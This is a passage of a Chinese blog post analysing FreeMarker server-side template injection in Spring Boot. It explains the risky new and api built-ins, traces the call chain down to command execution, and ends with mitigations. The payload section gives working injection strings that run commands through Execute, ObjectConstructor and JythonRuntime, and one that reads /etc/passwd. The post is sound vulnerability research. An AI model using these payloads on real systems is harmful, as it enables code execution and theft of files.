+<h3 id="3、Freemarker-内建函数"><a href="#3、Freemarker-内建函数" class="headerlink" title="3、Freemarker 内建函数"></a>3、Freemarker 内建函数</h3><p>Freemarker 提供了很多内置函数供开发者使用，具体见<a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/ref_builtins.html">官方文档</a>，存在风险的函数为 new 和 api,详情如下：</p>
+<h4 id="1-、new"><a href="#1-、new" class="headerlink" title="(1)、new"></a>(1)、new</h4><p>用来创建一个确定的 TemplateModel 实现变量的内建函数。<br>在 ? 的左边你可以指定一个字符串， 值为 TemplateModel 实现类的完全限定名。 结果是调用构造方法生成一个方法变量，然后将新变量返回。<br>例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;#-- Creates an user-defined directive be calling the parameterless constructor of the class --&gt;<br>&lt;#assign word_wrapp = &quot;com.acmee.freemarker.WordWrapperDirective&quot;?new()&gt;<br>&lt;#-- Creates an user-defined directive be calling the constructor with one numerical argument --&gt;<br>&lt;#assign word_wrapp_narrow = &quot;com.acmee.freemarker.WordWrapperDirective&quot;?new(40)&gt;<br></code></pre></td></tr></table></figure>
+
+<p>该内建函数可以创建任意的 Java 对象，只要类实现了 TemplateModel 接口即可创建进而使用这些对象， 并且可以触发没有实现 TemplateModel 接口的类的静态初始化块。<br> 2.3.17后可使用 Configuration.setNewBuiltinClassResolver(TemplateClassResolver) 、new_builtin_class_resolver 限制 new 内建函数对类的访问。 </p>
+<h4 id="2-、api"><a href="#2-、api" class="headerlink" title="(2)、api"></a>(2)、api</h4><p>api 内建函数于 FreeMarker 2.3.22 版本出现，之前版本不存在。<br>如果value本身支持这个额外的特性， value?api 提供访问 value 的API (通常是 Java API)，比如 <code>value?api.someJavaMethod()</code>， 当需要调用对象的Java方法时，这种方式很少使用， 但是 FreeMarker 揭示的value的简化视图的模板隐藏了它，也没有相等的内建函数。 例如，当有一个 Map，并放入数据模型 (使用默认的对象包装器)，模板中的 myMap.myMethod() 基本上翻译成Java的 (<code>(Method) myMap.get(&quot;myMethod&quot;)).invoke(...)，</code>因此不能调用 myMethod。如果编写了 <code>myMap?api.myMethod()</code> 来代替，那么就是Java中的 myMap.myMethod()。<br>api 内建函数使用存在以下限制：</p>
+<ul>
+<li>api_builtin_enabled 配置设置项必须设置为 true。 2.3.22 版本及之后默认为 false</li>
+<li>值本身要支持它。我们在讨论当模板看到的值，它是通过对象包装从原始对象值(来自于数据模型或者Java方法的返回值)中创建的。 因此，这就依赖 FreeMarker 的配置设置项 object_wrapper， 还有被包装的(原始)对象：<ul>
+<li>当对象包装器是 DefaultObjectWrapper ，并且它的 incompatibleImprovements 设置为 2.3.22 或更高 (在这里看如何设置它) (事实上，要做的是将它的 useAdaptersForContainer 属性设置为 true，但那是提到的 incompatibleImprovements 的默认值)时，从 Map 和 List 中得到FTL值支持 ?api。其它的 java.util.Collections 也是这样，如果 DefaultObjectWrapper 的 forceLegacyNonListCollections 属性设置为 false (默认是 true， 这是为了更好的向后兼容拆包)。</li>
+<li>当被纯 BeansWrapper 包装时，所有值都支持 ?api。但是再次重申，如果有其它方法，就避免使用它。</li>
+<li>实现了 freemarker.template.TemplateModelWithAPISupport 接口， 自定义的 TemplateModel 可以支持 ?api。</li>
+</ul>
+</li>
+</ul>
+<p>当在配置中不允许或值本身不支持 ?api 时使用了它， 就会中止模板处理并发生错误。</p>
+<h2 id="三、Freemarker-模板注入漏洞分析"><a href="#三、Freemarker-模板注入漏洞分析" class="headerlink" title="三、Freemarker 模板注入漏洞分析"></a>三、Freemarker 模板注入漏洞分析</h2><h3 id="1、获取模板"><a href="#1、获取模板" class="headerlink" title="1、获取模板"></a>1、获取模板</h3><p>Spring boot 所有http请求均调用org.springframework.web.servlet.FrameworkServlet#service()方法进行处理，调用super.service()进行处理<br><img src="/image/1692601460428-d9d31724-a209-438a-962d-e3433eefae48.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>调用至javax.servlet.http.HttpServlet#service()<br><img src="/image/1692601561814-a1b02020-2ce9-448b-99f5-3a2780118cde.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>调用至javax.servlet.http.HttpServlet#doget()<br><img src="/image/1692601590997-6936a0a2-abb7-41fb-99ab-d8ad8257e147.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>调用至rg.springframework.web.servlet.FrameworkServlet#processRequest()<br><img src="/image/1692601622764-805dc5eb-68d7-4fe8-b188-80f063cf12a6.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>org.springframework.web.servlet.DispatcherServlet#doService()  –&gt;<br>org.springframework.web.servlet.DispatcherServlet #doDispatch()  –&gt;</p>
+<p><img src="/image/image-20230831222714908.png" srcset="/img/loading.gif" lazyload alt="image-20230831222714908"></p>
+<p>org.springframework.web.servlet.DispatcherServlet #processDispatchResult()  –&gt;<br>调用至org.springframework.web.servlet.DispatcherServlet#render()<br><img src="/image/1692602149932-c030eb2f-68b4-4e5b-a68e-aa9e057e1c89.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>org.springframework.web.servlet.DispatcherServlet#resolveViewName()  –&gt;<br>org.springframework.web.servlet.view.ContentNegotiatingViewResolver#resolveViewName()  –&gt;<br>org.springframework.web.servlet.view.ContentNegotiatingViewResolver#getCandidateViews()  –&gt;<br>org.springframework.web.servlet.view.AbstractCachingViewResolver#resolveViewName()  –&gt;<br>org.springframework.web.servlet.view.UrlBasedViewResolver#createView() 创建模板，此方法先判断是否为跳转为跳转也没，此处均不进入 if 最终调用super.createView()<br><img src="/image/1692602913661-b9a4d5b3-416e-4448-8e6c-2b598232ac4c.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>org.springframework.web.servlet.view.AbstractCachingViewResolver#createView()<br><img src="/image/1692603044878-90df8b29-677d-46d8-916b-b7feee16cab6.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>org.springframework.web.servlet.view.AbstractCachingViewResolver#loadView()<br><img src="/image/1692603062382-755bff01-0f67-4666-933c-e7fe33c28d6b.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>org.springframework.web.servlet.view.AbstractTemplateViewResolver#buildView()<br><img src="/image/1692603128711-c55b32e7-c58f-4993-b78f-c0bf705357ee.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>org.springframework.web.servlet.view.UrlBasedViewResolver#buildView() 此处通过 <code>this.instantiateView() </code>new 一个 FreeMarkerView 类，然后进行了一些基础赋值，构建 View 基础框架，此处设置 url 并添加 .ftl后缀。<br><img src="/image/1693463452916-d602cad0-ce1e-48f8-a288-d6352649eba2.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="/image/1692603220587-66f3a53f-d9d8-4b69-bda2-76e5712b7b98.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>org.springframework.web.servlet.view.AbstractCachingViewResolver#loadView() 方法调用buildView() 后，继续调用view.checkResource()<br><img src="/image/1692603062382-755bff01-0f67-4666-933c-e7fe33c28d6b.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>org.springframework.web.servlet.view.freemarker.FreeMarkerView#checkResource() 判断 url 是否为空，不为空后调用 getTemplate(url, locale)</p>
+<p><img src="/image/image-20230831213348548.png" srcset="/img/loading.gif" lazyload alt="image-20230831213348548"></p>
+<p>org.springframework.web.servlet.view.freemarker.FreeMarkerView#getTemplate(url, locale)</p>
+<p><img src="/image/image-20230831213451184.png" srcset="/img/loading.gif" lazyload alt="image-20230831213451184"></p>
+<p>freemarker.template.Configuration#getTemplate() 调用此类同名方法,跟进this.cache.getTemplate()</p>
+<p><img src="/image/image-20230831213617838.png" srcset="/img/loading.gif" lazyload alt="image-20230831213617838"></p>
+<p><img src="/image/image-20230831213702913.png" srcset="/img/loading.gif" lazyload alt="image-20230831213702913"></p>
+<p>freemarker.cache.TemplateCache#getTemplate() ,跟进this.getTemplateInternal()</p>
+<p><img src="/image/image-20230831213852936.png" srcset="/img/loading.gif" lazyload alt="image-20230831213852936"></p>
+<p>freemarker.cache.TemplateCache#getTemplateInternal(),此处进行判断  –&gt;</p>
+<p><img src="/image/image-20230831214145389.png" srcset="/img/loading.gif" lazyload alt="image-20230831214145389"></p>
+<p>freemarker.cache.TemplateCache#lookupTemplate()  –&gt;</p>
+<p>freemarker.cache.TemplateLookupStrategy#lookup()  –&gt;</p>
+<p>freemarker.cache.TemplateCache#lookupWithLocalizedThenAcquisitionStrategy()</p>
+<p>…</p>
+<p>最终调用<code>this.lookupWithLocalizedThenAcquisitionStrategy()</code>,此处会先拼接 _zh_CN,再寻找未拼接_zh_CN的模板名，调用this.findTemplateSource(path)获取模板实例。</p>
+<p><img src="/image/image-20230831221401069.png" srcset="/img/loading.gif" lazyload alt="image-20230831221401069"></p>
+<p><img src="/image/image-20230831221447397.png" srcset="/img/loading.gif" lazyload alt="image-20230831221447397"></p>
+<p>此处获取到模板文件里数据</p>
+<h3 id="2、解析模板"><a href="#2、解析模板" class="headerlink" title="2、解析模板"></a>2、解析模板</h3><p>回到org.springframework.web.servlet.DispatcherServlet#render()  resolveViewName()加载模板文件后使用view.render()对模板进行解析。</p>
+<p><img src="/image/image-20230831224541162.png" srcset="/img/loading.gif" lazyload alt="image-20230831224541162"></p>
+<p>最终调用至 org.springframework.web.servlet.view.freemarker.FreeMarkerView#doRender()</p>
+<p><img src="/image/image-20230901140401840.png" srcset="/img/loading.gif" lazyload alt="image-20230901140401840"></p>
+<p>org.springframework.web.servlet.view.freemarker.FreeMarkerView#processTemplate()</p>
+<p><img src="/image/image-20230901140448277.png" srcset="/img/loading.gif" lazyload alt="image-20230901140448277"></p>
+<p>freemarker.template.Template#process()   调用createProcessingEnvironment()#process(),createProcessingEnvironment()返回Environment 类，故即调用 Environment#process()</p>
+<p><img src="/image/image-20230901140537699.png" srcset="/img/loading.gif" lazyload alt="image-20230901140537699"></p>
+<p>freemarker.core.Environment#process()</p>
+<p><img src="/image/image-20230901151520810.png" srcset="/img/loading.gif" lazyload alt="image-20230901151520810"></p>
+<p>freemarker.core.Environment#visit() 对 ftl 的文件进行遍历,若读取到一条 freeMarker 表达式，回调 visit() 方法， visit() 方法调用element.accept()</p>
+<p><img src="/image/image-20230901151620894.png" srcset="/img/loading.gif" lazyload alt="image-20230901151620894"></p>
+<p>freemarker.core.Assignment#accept()  判断 namespaceExp 是否为 null，接着判断 this.operatorType 是否等于 65536，跟进 eval() 方法</p>
+<p><img src="/image/image-20230902091715395.png" srcset="/img/loading.gif" lazyload alt="image-20230902091715395"></p>
+<p>freemarker.core.Expression#eval() 方法判断 constantValue 是否为 null，此处 constantValue 为 null，调用 this._eval()</p>
+<p><img src="/image/image-20230902091752082.png" srcset="/img/loading.gif" lazyload alt="image-20230902091752082"></p>
+<p>freemarker.core.MethodCall#_eval()  此处 targetMethod 即在 ftl 语句中声明的类</p>
+<p><img src="/image/image-20230902092640533.png" srcset="/img/loading.gif" lazyload alt="image-20230902092640533"></p>
+<p>freemarker.core.NewBI#exec() 中调用 newInstance() 初始化声明的类</p>
+<p><img src="/image/image-20230902092809418.png" srcset="/img/loading.gif" lazyload alt="image-20230902092809418"></p>
+<p>类初始化完成后继续遍历 ftl文件，遍历至<code>value(&quot;Calc&quot;)</code> ，调用至 freemarker.core.DollarVariable#accept()，与之前调用链一致，最终调用至 freemarker.core.MethodCall#_eval() </p>
+<p><img src="/image/image-20230902094928492.png" srcset="/img/loading.gif" lazyload alt="image-20230902094928492"></p>
+<p>此处即调用至 freemarker.template.utility.Execute#exec() 进行命令执行</p>
+<p><img src="/image/image-20230902095100008.png" srcset="/img/loading.gif" lazyload alt="image-20230902095100008"></p>
+<h3 id="3、paylod"><a href="#3、paylod" class="headerlink" title="3、paylod"></a>3、paylod</h3><h4 id="1-、new-函数"><a href="#1-、new-函数" class="headerlink" title="(1)、new() 函数"></a>(1)、new() 函数</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">&lt;#<span class="hljs-keyword">assign</span> value=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?new()&gt;<span class="hljs-symbol">$</span>&#123;value(<span class="hljs-string">&quot;Calc&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ftl">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;Calc&quot;).start()&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc&quot;)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;Calc&quot;) &#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-、api-函数"><a href="#2-、api-函数" class="headerlink" title="(2)、api() 函数"></a>(2)、api() 函数</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">#assign classLoader=object?api.class.protectionDomain.classLoader&gt; <br>&lt;#assign clazz=classLoader.loadClass(&quot;ClassExposingGSON&quot;)&gt; <br>&lt;#assign field=clazz?api.getField(&quot;GSON&quot;)&gt; <br>&lt;#assign gson=field?api.get(null)&gt; <br>&lt;#assign ex=gson?api.fromJson(&quot;&#123;&#125;&quot;, classLoader.loadClass(&quot;freemarker.template.utility.Execute&quot;))&gt; <br>$&#123;ex(&quot;Calc&quot;&quot;)&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;#assign is=object?api.class.getResourceAsStream(&quot;/Test.class&quot;)&gt;<br>FILE:[&lt;#list 0..999999999 as _&gt;<br>    &lt;#assign byte=is.read()&gt;<br>    &lt;#if byte == -1&gt;<br>        &lt;#break&gt;<br>    &lt;/#if&gt;<br>$&#123;byte&#125;, &lt;/#list&gt;]<br>&lt;#assign uri=object?api.class.getResource(&quot;/&quot;).toURI()&gt;<br>&lt;#assign input=uri?api.create(&quot;file:///etc/passwd&quot;).toURL().openConnection()&gt;<br>&lt;#assign is=input?api.getInputStream()&gt;<br>FILE:[&lt;#list 0..999999999 as _&gt;<br>    &lt;#assign byte=is.read()&gt;<br>    &lt;#if byte == -1&gt;<br>        &lt;#break&gt;<br>    &lt;/#if&gt;<br>$&#123;byte&#125;, &lt;/#list&gt;]<br></code></pre></td></tr></table></figure>
+
+<h2 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h2><p>从 <strong>2.3.17</strong>版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：<br>1、UNRESTRICTED_RESOLVER：可以通过 <code>ClassUtil.forName(className)</code> 获取任何类。</p>
+<p>2、SAFER_RESOLVER：不能加载 <code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类。<br>3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。<br>可通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法设置<code>TemplateClassResolver</code>，从而限制通过<code>new()</code>函数对<code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类的解析。</p>
+<p>4、当<code>api_builtin_enabled</code>为true时才可使用api函数，而该配置在<strong>2.3.22版本</strong>之后默认为false。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SSTI-Freemarker模板注入漏洞</div>
+      <div>http://example.com/2023/09/02/SSTI-Freemarker模板注入漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/05/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-JAVA%20WEB%E5%9F%BA%E7%A1%80(%E4%B8%80)/" title="JAVA代码审计-JAVA WEB基础(一)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JAVA代码审计-JAVA WEB基础(一)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/19/Nacos-%E5%86%85%E7%BD%91%E9%9B%86%E7%BE%A4-Raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Nacos 内网集群 Raft 反序列化漏洞">
+                        <span class="hidden-mobile">Nacos 内网集群 Raft 反序列化漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
